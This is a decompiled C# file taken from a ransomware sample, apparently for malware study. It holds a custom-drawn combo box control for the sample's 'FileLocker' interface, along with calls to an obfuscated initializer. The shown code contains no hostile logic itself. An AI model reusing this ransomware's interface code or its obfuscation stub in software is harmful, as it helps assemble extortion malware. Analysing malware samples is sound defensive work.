// Decompiled with JetBrains decompiler
// Type: FileLocker.AVComboBox
// Assembly: FileLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E5EE51A-6914-4180-A10A-8B6B85AFF127
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Ransom.Win32.Blocker.ibjo-459a487b0ad80fc56c06fca73eb80b3268bd423eaf6da5a1b400a7b5c19fb957.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace FileLocker
{
  public class AVComboBox : ComboBox
  {
    private static List<WeakReference> __ENCList;
    private int _StartIndex;
    private Color C1;
    private Color C2;

    [DebuggerNonUserCode]
    static AVComboBox()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      AVComboBox.__ENCList = new List<WeakReference>();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object object_0)
    {
      lock (AVComboBox.__ENCList)
      {
        if (AVComboBox.__ENCList.Count == AVComboBox.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (AVComboBox.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (AVComboBox.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                AVComboBox.__ENCList[index1] = AVComboBox.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          AVComboBox.__ENCList.RemoveRange(index1, checked (AVComboBox.__ENCList.Count - index1));
          AVComboBox.__ENCList.Capacity = AVComboBox.__ENCList.Count;
        }
        AVComboBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
      }
    }

    public int StartIndex
    {
      get => this._StartIndex;
      set
      {
        this._StartIndex = value;
        try
        {
          this.SelectedIndex = value;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        this.Invalidate();
      }
    }

    public void ReplaceItem(object sender, DrawItemEventArgs e)
    {
      e.DrawBackground();
      try
      {
        if ((e.State & DrawItemState.Selected) == DrawItemState.Selected)
        {
          e.Graphics.FillRectangle((Brush) new SolidBrush(Color.LightGray), e.Bounds);
          using (SolidBrush solidBrush = new SolidBrush(e.ForeColor))
            e.Graphics.DrawString(this.GetItemText(RuntimeHelpers.GetObjectValue(this.Items[e.Index])), new Font("Verdana", 10f), (Brush) solidBrush, 1f, (float) checked (e.Bounds.Top + 5));
        }
        else
          e.Graphics.DrawString(this.GetItemText(RuntimeHelpers.GetObjectValue(this.Items[e.Index])), new Font("Verdana", 10f), Brushes.Gray, 1f, (float) checked (e.Bounds.Top + 5));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      e.DrawFocusRectangle();
      this.Invalidate();
    }

    protected void DrawTriangle(
      Color color_0,
      Point point_0,
      Point point_1,
      Point point_2,
      Graphics graphics_0)
    {
      graphics_0.FillPolygon((Brush) new SolidBrush(color_0), new List<Point>()
      {
        point_0,
        point_1,
        point_2
      }.ToArray());
    }

    public AVComboBox()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.DrawItem += new DrawItemEventHandler(this.ReplaceItem);
      AVComboBox.__ENCAddToList((object) this);
      this._StartIndex = 0;
      this.C1 = Color.FromArgb(254, 254, 254);
      this.C2 = Color.FromArgb(244, 244, 244);
      this.Width = 163;
      this.Font = new Font("Verdana", 15f);
      this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.DoubleBuffer, true);
      this.DrawMode = DrawMode.OwnerDrawFixed;
      this.BackColor = this.C1;
      this.ForeColor = this.C1;
      this.DropDownStyle = ComboBoxStyle.DropDownList;
      this.DoubleBuffered = true;
    }

    protected override void OnTextChanged(EventArgs e)
    {
      base.OnTextChanged(e);
      this.Invalidate();
    }

    protected override void OnMouseDown(MouseEventArgs e)
    {
      this.C2 = Color.FromArgb(233, 233, 233);
      this.Invalidate();
      this.OnMouseClick(e);
    }

    protected override void OnMouseUp(MouseEventArgs e)
    {
      this.C2 = Color.FromArgb(244, 244, 244);
      this.Invalidate();
      base.OnMouseUp(e);
    }

    protected override void OnPaint(PaintEventArgs e)
    {
      base.OnPaint(e);
      Graphics graphics1 = e.Graphics;
      Graphics graphics2 = graphics1;
      SolidBrush solidBrush = new SolidBrush(Color.FromArgb(this.C2.ToArgb()));
      Rectangle rectangle = new Rectangle(checked (this.Width - 20), 2, 17, checked (this.Height - 5));
      Rectangle rect1 = rectangle;
      graphics2.FillRectangle((Brush) solidBrush, rect1);
      graphics1.SmoothingMode = SmoothingMode.HighQuality;
      try
      {
        Graphics graphics3 = graphics1;
        Pen pen1 = new Pen((Brush) new SolidBrush(Color.FromArgb(216, 216, 216)));
        rectangle = new Rectangle(checked (this.Width - 20), 2, 17, checked (this.Height - 5));
        Rectangle rect2 = rectangle;
        graphics3.DrawRectangle(pen1, rect2);
        try
        {
          Graphics graphics4 = graphics1;
          string text = this.Text;
          Font font = new Font("Verdana", 10f);
          Brush gray = Brushes.Gray;
          rectangle = new Rectangle(3, 0, checked (this.Width - 20), this.Height);
          RectangleF layoutRectangle = (RectangleF) rectangle;
          StringFormat format = new StringFormat()
          {
            LineAlignment = StringAlignment.Center,
            Alignment = StringAlignment.Near
          };
          graphics4.DrawString(text, font, gray, layoutRectangle, format);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        graphics1.DrawLine(new Pen((Brush) new SolidBrush(Color.FromArgb(216, 216, 216))), 0, 0, 0, 0);
        Graphics graphics5 = graphics1;
        Pen pen2 = new Pen((Brush) new SolidBrush(Color.FromArgb(216, 216, 216)));
        rectangle = new Rectangle(0, 0, checked (this.Width - 1), checked (this.Height - 1));
        Rectangle rect3 = rectangle;
        graphics5.DrawRectangle(pen2, rect3);
        this.DrawTriangle(Color.FromArgb(216, 216, 216), new Point(checked (this.Width - 15), 14), new Point(checked (this.Width - 8), 14), new Point(checked (this.Width - 12), 17), graphics1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
